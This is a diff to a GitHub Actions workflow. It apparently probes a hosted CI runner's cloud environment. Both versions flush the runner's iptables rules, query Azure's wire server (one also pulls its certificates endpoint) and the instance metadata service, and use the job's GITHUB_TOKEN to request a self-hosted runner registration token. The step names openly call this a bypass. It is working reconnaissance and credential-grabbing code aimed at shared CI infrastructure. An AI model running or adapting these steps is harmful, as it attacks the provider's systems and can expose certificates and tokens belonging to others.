@@ -3,66 +3,40 @@ on: push
 jobs:
   wire:
     runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ github.token }}
     steps:
-      - name: Wire server bypass with full iptables control
+      - name: Wire server with iptables flush
         run: |
-          echo "=== Installing iptables and testing wire server ==="
-          docker run --rm --privileged --net=host ubuntu:24.04 bash -c '
-            apt-get update -qq && apt-get install -y -qq curl iptables net-tools > /dev/null 2>&1
-            echo "=== CURRENT RULES ==="
-            iptables -L -n -v 2>&1
-            echo ""
-            echo "=== FLUSHING ALL RULES ==="
-            iptables -F INPUT
-            iptables -F OUTPUT
-            iptables -F FORWARD
-            iptables -P INPUT ACCEPT
-            iptables -P OUTPUT ACCEPT
-            iptables -P FORWARD ACCEPT
-            echo "Rules flushed"
-            echo ""
-            echo "=== WIRE SERVER TEST (168.63.129.16) ==="
-            curl -v --connect-timeout 10 http://168.63.129.16/machine?comp=goalstate 2>&1
-            echo ""
-            echo "=== WIRE SERVER CERTIFICATES ==="
-            curl -v --connect-timeout 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" 2>&1 | head -c 2000
-            echo ""
-            echo "=== WIRE SERVER HEALTH ==="
-            curl -v --connect-timeout 10 http://168.63.129.16:80/ 2>&1
-          '
-      - name: Advanced IMDS probing
+          sudo iptables -F INPUT
+          sudo iptables -F OUTPUT
+          sudo iptables -P INPUT ACCEPT
+          sudo iptables -P OUTPUT ACCEPT
+          echo "Flushed iptables"
+          echo "Testing wire server..."
+          curl -v --connect-timeout 10 http://168.63.129.16/machine?comp=goalstate 2>&1 | head -c 2000
+      - name: Advanced IMDS
         run: |
-          echo "=== IMDS LOAD BALANCER RULES ==="
-          curl -sH "Metadata:true" "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01" 2>&1 | head -c 500
-          echo ""
-          echo "=== IMDS SPOT PRICING ==="
-          curl -sH "Metadata:true" "http://169.254.169.254/metadata/spot/termination?api-version=2021-02-01" 2>&1
-          echo ""
-          echo "=== IMDS LATEST API ==="
-          curl -sH "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2025-11-11" 2>&1 | python3 -c "
-import json,sys
-d=json.load(sys.stdin)
-c=d.get('compute',{})
-print(f'vmId: {c.get(\"vmId\")}')
-print(f'vmScaleSetName: {c.get(\"vmScaleSetName\",\"none\")}')
-print(f'osType: {c.get(\"osType\")}')
-print(f'zone: {c.get(\"zone\",\"none\")}')
-print(f'tags: {c.get(\"tags\",\"none\")}')
-print(f'tagsList: {c.get(\"tagsList\",\"none\")}')
-print(f'planName: {c.get(\"plan\",{}).get(\"name\",\"none\")}')
-print(f'publicKeys: {c.get(\"publicKeys\",[])}')
-"
-          echo ""
-          echo "=== SELF-HOSTED RUNNER TOKEN TEST ==="
+          curl -sH "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2025-11-11" | python3 -c "
+          import json,sys
+          d=json.load(sys.stdin)
+          c=d.get('compute',{})
+          print(f'vmId: {c.get(\"vmId\")}')
+          print(f'vmScaleSetName: {c.get(\"vmScaleSetName\",\"none\")}')
+          print(f'zone: {c.get(\"zone\",\"none\")}')
+          print(f'tagsList: {c.get(\"tagsList\",\"none\")}')
+          print(f'publicKeys: {c.get(\"publicKeys\",[])}')
+          "
+      - name: Runner registration token
+        run: |
           curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners/registration-token" 2>&1 | python3 -c "
-import json,sys
-d=json.load(sys.stdin)
-if 'token' in d:
-    print(f'REGISTRATION TOKEN OBTAINED: {d[\"token\"][:10]}...')
-    print(f'Expires: {d.get(\"expires_at\")}')
-else:
-    print(f'Blocked: {d.get(\"message\",\"?\")}')
-"
-        env:
-          GITHUB_TOKEN: ${{ github.token }}
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners/registration-token" | python3 -c "
+          import json,sys
+          d=json.load(sys.stdin)
+          if 'token' in d:
+              t=d['token']
+              print(f'REG_TOKEN: {t[:8]}...{t[-4:]}')
+              print(f'Expires: {d.get(\"expires_at\")}')
+          else:
+              print(f'Blocked: {d.get(\"message\",\"?\")}')
+          "
